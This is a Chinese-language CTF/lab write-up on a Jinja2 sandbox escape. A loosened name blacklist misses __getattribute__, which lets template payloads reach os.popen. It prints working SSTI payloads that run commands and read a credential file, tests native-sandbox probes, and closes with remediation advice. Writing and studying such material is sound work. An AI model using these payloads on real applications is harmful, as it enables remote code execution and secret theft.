# 欢迎语模板处的 Jinja2 沙箱逃逸

## 这一题在教什么

**自己放宽的沙箱。**

Jinja2 自带一个 `SandboxedEnvironment`。这一题的开发用了它 —— 然后觉得默认那个
"太严了"（模板里取个 `__dict__` 都不行，业务上不方便），于是继承了一个子类，
改成"只拉黑几个听起来最危险的名字"。

**这份黑名单漏了 `__getattribute__`。** 而它是一个"用调用的方式取属性"的方法 ——
沙箱的属性检查根本拦不到它。

> 先说清楚一件事，免得把结论搞错：**这一题不是"Jinja2 的沙箱有洞"。**
> 我在 Jinja2 3.1.6 上实测过原生 `SandboxedEnvironment`，
> 那些经典逃逸链**全部失效**（下面有清单）。真正有洞的是
> **这个应用自己放宽的那一层** —— 而"自己写一层安全过滤"恰恰是
> 真实世界里更常见的情况。

## 漏洞在哪

`module.py`：

```python
class LooseSandbox(SandboxedEnvironment):
    BLOCKED = {
        "__globals__", "__builtins__", "__subclasses__", "__import__",
        "__loader__", "__code__", "__reduce__", "__base__", "__mro__",
    }

    def is_safe_attribute(self, obj, attr, value):
        return attr not in self.BLOCKED
```

两层问题：

**一、黑名单永远列不全。** 它列了 9 个，看着挺认真，但漏了。

**二、更根本："按名字拉黑"这条路本身走不通。** 因为 `__getattribute__`
是"用**调用**的方式取属性"：

```python
obj.__getattribute__("名字")     # 等价于 obj.名字，但它是**一次方法调用**
```

而沙箱的 `is_safe_attribute` 只在**属性访问**的时候被调用。
所以只要 `__getattribute__` 这个**名字**没被拉黑，整个黑名单就作废。

## 怎么打通

### 第一步：把黑名单试出来

```
{{ ''.__class__.__mro__ }}              → 渲染成空（名字被拉黑了）
{{ ''.__class__.__subclasses__() }}     → 报错（调用了一个被拉黑的属性）
{{ lipsum.__globals__ }}                → 渲染成空
{{ lipsum|attr('__globals__') }}        → 渲染成空（|attr 内部还是会问沙箱）
```

### 第二步：换个方式取属性

```
{{ lipsum.__getattribute__('__globals__') }}
```

这一下就把全局名字空间整个交出来了。

**为什么 `lipsum`**：Jinja 默认往模板里放了一批全局名字（`lipsum`、`cycler`、
`joiner`、`namespace`、`range`、`dict`……）。`lipsum` 是定义在 `jinja2/utils.py`
里的一个函数，而那个模块的全局里有 `os` —— 所以顺着它就能到命令执行。
实测确认：

```python
>>> import jinja2.utils
>>> "os" in jinja2.utils.generate_lorem_ipsum.__globals__
True
```

### 第三步：接上命令执行

```
{{ lipsum.__getattribute__('__globals__')['os'].popen('id').read() }}
```

### 第四步：读这一题的目标文件

```
{{ lipsum.__getattribute__('__globals__')['os']
    .popen('cat <目标文件路径>').read() }}
```

那串 `WELCOME-OPS-` 开头的凭据出现在「渲染结果」里就通关了。

### 其他等价写法

```
{{ cycler.__init__.__getattribute__('__globals__')['os'].popen('id').read() }}
{{ joiner.__getattribute__('__globals__')['os'].popen('id').read() }}
{{ lipsum.__getattribute__('__glo'~'bals__')['os'].popen('id').read() }}
```

最后那条用 `~` 拼字符串的写法说明了一件事：

> **如果黑名单是在源码上做字符串匹配的**（比如 `source.replace("__globals__", "")`），
> 那拼接就能绕过。
> **而这一题的黑名单在属性检查那一层**，所以拼不拼都行 ——
> 真正的问题是它漏了 `__getattribute__` 这个**名字**。

## 原生 Jinja2 沙箱实测清单（值得知道）

我在 Jinja2 **3.1.6** 上把常见 payload 逐个跑过：

| payload | 结果 |
|---|---|
| `{{ 7*7 }}` | 正常（49） |
| `{{ ''.__class__ }}` | 渲染成空（`unsafe_undefined`） |
| `{{ ''.__class__.__mro__ }}` | `SecurityError` |
| `{{ [].__class__.__base__.__subclasses__() }}` | `SecurityError` |
| `{{ lipsum.__globals__ }}` | 渲染成空 |
| `{{ lipsum\|attr('__globals__') }}` | 渲染成空 |
| `{{ lipsum\|attr('__glo'~'bals__') }}` | 渲染成空（拼接也救不了） |
| `{{ cycler\|attr('__init__') }}` | 渲染成空 |
| `{{ ''\|map(attribute='__class__')\|list }}` | `[Undefined]` |
| `{{ [1]\|groupby('__class__') }}` | `[(Undefined, [1])]` |
| `{{ '{0.__class__}'.format('') }}` | `SecurityError`（Jinja 专门处理了 `str.format`） |
| `{% include '/etc/passwd' %}` | `TemplateNotFound` |
| `{{ ''.__getattribute__('__class__') }}` | `SecurityError` |

**原因**：原生的 `is_safe_attribute` 是

```python
return not (attr.startswith("_") or is_internal_attribute(obj, attr))
```

它拦的正是"**以下划线开头的属性**"—— 那是从对象逃到 Python 内部的唯一入口。
所以这一版沙箱**没有**这些逃逸链。

**但有两件事它挡不住**（这是更重要的教训）：

```jinja
{{ config }}                 ← 原样泄露 Flask 的 config（里面就有 SECRET_KEY）
{{ request.environ }}        ← 原样泄露 WSGI 环境变量
```

因为 `config` / `request` 是**应用自己放进上下文的**，它们不以 `_` 开头。

> **沙箱管不住「你放进上下文的东西」。**
> 上下文里放了什么，模板就能拿到什么 —— 这跟沙箱严不严一点关系都没有。

## 怎么修

**一、别让用户写模板语言。（这是根治）**

"自定义文案"这个需求用**占位符**就够了：

```python
TEMPLATE = "你好，{name}！欢迎回到{company}（{plan}）。"
rendered = TEMPLATE.format(**{k: str(v) for k, v in safe_values.items()})
```

`str.format` 只做字段替换，没有属性访问、没有函数调用、没有控制流。
**用户能表达的东西从"一门语言"降到"几个字面占位符"，整个漏洞类别消失。**

（注意 `str.format` 本身也有历史坑：`"{0.__class__}".format(x)` 会做属性访问。
所以要用**受控的占位符名**，或者用 `string.Template`。）

**二、真要允许模板，就用原生沙箱 + 别往上下文里放有能力的对象。**

```python
env = SandboxedEnvironment()          # 不要继承去放宽它
```

配套的两条：

- **上下文只放"值"，不放"对象"**。要传用户信息就传
  `{"user_name": "alice", "user_email": "..."}`，别传整个 `User` 实例 ——
  实例上挂着数据库连接、配置引用之类的东西
- **`config` / `request` / `session` / `g` 这些 Flask 自动注入的全局，
  在渲染用户模板时要拿掉**：

```python
env = SandboxedEnvironment(loader=...)
env.globals.clear()                    # 清掉 lipsum/cycler 这些
# 渲染时显式给一个干净的上下文
env.from_string(user_template).render(**only_values)
```

**三、如果非要自己写一层检查，别用"名字黑名单"。**

黑名单在这个场景里必然失败，因为：

1. 名字列不全（`__getattribute__`、`__getattr__`、`__setattr__`、
   `__dict__`、`__class__`……）
2. `getattr(obj, 动态拼出来的名字)` 绕得过任何字符串匹配
3. 取属性的方式不止一种（直接访问、`getattr`、`__getattribute__`、
   `operator.attrgetter`、`vars`、`format` 字符串……）

**白名单**（"只允许这几个属性"）是唯一的可行方向。而那就等于原生沙箱了 ——
所以绕了一圈回到："用原生沙箱，别放宽。"

**四、把模板渲染放到受限进程里。**

真要允许较强的模板能力，就把渲染放进一个子进程 / 容器，
低权限、无网络、只挂载它需要的那几个目录。**不指望沙箱不出错，指望出错也不致命。**

## 顺手想想

- 为什么 `|attr('__globals__')` 在原生沙箱里也失效？
  （提示：去看 `do_attr` 的实现 —— 它内部还是要问沙箱）
- `{{ config }}` 在原生沙箱下能泄露 SECRET_KEY。那拿到 SECRET_KEY 之后能干什么？
  （提示：去看 `flask_session/forged_cookie`）
- 如果应用**只**把 `{"user_name": str, "company": str}` 放进上下文，
  而且用的是原生沙箱 —— 还有攻击面吗？
- 为什么 Jinja 的作者在文档里明写"sandbox 不是安全边界"？
  （提示：它的设计目标是"防开发者的失误"，不是"防攻击者"）
